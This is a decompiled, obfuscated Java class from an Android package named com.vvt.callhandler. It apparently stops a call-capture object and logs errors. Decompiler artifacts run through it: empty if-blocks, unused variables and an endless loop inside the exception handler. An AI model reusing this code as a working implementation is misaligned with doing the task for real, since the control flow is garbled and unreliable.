package com.vvt.callhandler;

class i
  extends com.vvt.aj.a
{
  i(c paramc, String paramString, long paramLong)
  {
    super(paramString, paramLong);
  }
  
  public void a()
  {
    boolean bool1 = c.e();
    if (bool1) {}
    Object localObject = this.a;
    boolean bool2 = false;
    com.vvt.base.a locala = null;
    c.a((c)localObject, null);
    localObject = c.g(this.a);
    if (localObject != null)
    {
      localObject = c.g(this.a);
      bool1 = ((com.vvt.capture.a.a)localObject).e();
      if (!bool1) {}
    }
    try
    {
      localObject = this.a;
      localObject = c.g((c)localObject);
      ((com.vvt.capture.a.a)localObject).d();
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool2 = c.f();
        if (bool2) {}
        locala = c.f(this.a);
        String str = localException.toString();
        b.a(locala, str);
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/callhandler/i.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */